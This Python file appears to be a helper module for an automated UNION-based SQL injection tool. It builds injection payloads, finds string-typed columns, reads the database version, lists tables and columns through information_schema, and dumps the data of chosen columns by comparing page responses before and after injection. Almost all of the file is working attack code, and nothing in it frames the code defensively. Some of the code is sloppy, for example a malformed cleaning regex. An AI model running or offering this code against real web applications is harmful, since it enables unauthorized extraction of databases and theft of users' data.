import urllib

from bs4 import BeautifulSoup
import requests
import re

reserved_words = ['TestSQLinj', 'union', 'select', 'table_name=', 'information_schema.tables--', 'null', 'FROM',
                  'WHERE', 'column_name', 'information_schema.columns']

cleaner_regex = re.compile('.*\|\|.*||@||.*\'.*||.*null.*||.*--.*')


# Helper function to remove the tags from response
# Function to remove tags
def remove_tags(html):
    # parse html content
    soup = BeautifulSoup(html.text, "html.parser")
    for data in soup(['style', 'script']):
        # Remove tags
        data.decompose()
    # return data by retrieving the tag content
    return ' '.join(soup.stripped_strings)


# to determine the column(s) with string as data type
# function used in: step(b-1)
def figure_sting_columns(url, num_col):
    for i in range(1, num_col + 1):
        test_string = "'TestSQLinj'"
        payload_list = ['null'] * num_col
        payload_list[i - 1] = test_string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        res = requests.get(url + sql_payload).text
        if test_string.strip('\'') in res:
            return i, sql_payload
    return False


# return DB type and version
def figure_DB_version(url, sql_payload):
    res_before = requests.get(url)
    print("Hi from fig DB version sql payload is : {}".format(sql_payload))
    inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'version()')
    print("Hi from fig DB version inj query is : {}".format(inj_query))
    inj_url = url + inj_query
    print("Hi from fig DB version inj url is : {}".format(inj_url))
    res_after = requests.get(inj_url)
    cleand_after_res = str(remove_tags(res_after))
    databases_version = re.search("PostgreSQL.*|ubuntu.*|MySQL.*|SQL Server.*", cleand_after_res)
    return databases_version


# return list of tables in DB
# function used in: step(a-2)
def figure_tables_in_DB(url, sql_payload):
    res_before = requests.get(url)
    inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'table_name').strip(
        '--') + ' FROM information_schema.tables--'
    inj_url = url + inj_query
    res_after = requests.get(inj_url)
    cleand_after_res = remove_tags(res_after).split()
    cleand_before_res = remove_tags(res_before).split()
    diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
    new_diff_in_responses = []
    for i in diff_in_responses:
        if i not in reserved_words:
            cleantext = re.sub(cleaner_regex, '', i)
            if cleantext != '':
                new_diff_in_responses.append(cleantext)
    return new_diff_in_responses


# return list of columns in specific table
# function used in: step(b-2)
def figure_columns_in_table(url, sql_payload, table_name):
    res_before = requests.get(url)
    extract_query = ' FROM information_schema.columns WHERE table_name=\'{}\'--'.format(table_name)
    inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'column_name').strip('--') + extract_query
    inj_url = url + inj_query
    res_after = requests.get(inj_url)
    cleand_after_res = remove_tags(res_after).split()
    cleand_before_res = remove_tags(res_before).split()
    diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
    reserved_words.append('\'{}\'--'.format(table_name))
    reserved_words.append('table_name=\'{}\'--'.format(table_name))
    new_diff_in_responses = []
    for i in diff_in_responses:
        if i not in reserved_words:
            cleantext = re.sub(cleaner_regex, '', i)
            if cleantext != '':
                new_diff_in_responses.append(cleantext)
    return new_diff_in_responses


# return data in selected columns
# function used in: step(c-2)
def figure_data_in_columns(url, sql_payload, table_name, column_name):
    res_before = requests.get(url)
    extract_query = ' FROM {}--'.format(table_name)
    inj_query = str(sql_payload).replace('\'TestSQLinj\'', column_name).strip('--') + extract_query
    inj_url = url + inj_query
    res_after = requests.get(inj_url)
    cleand_after_res = remove_tags(res_after).split()
    cleand_before_res = remove_tags(res_before).split()
    diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
    print("Ur data is here: ")
    new_diff_in_responses = []
    for i in diff_in_responses:
        if i not in reserved_words:
            cleantext = re.sub(cleaner_regex, '', i)
            if cleantext != '':
                new_diff_in_responses.append(cleantext)
    for i in new_diff_in_responses:
        print(i)
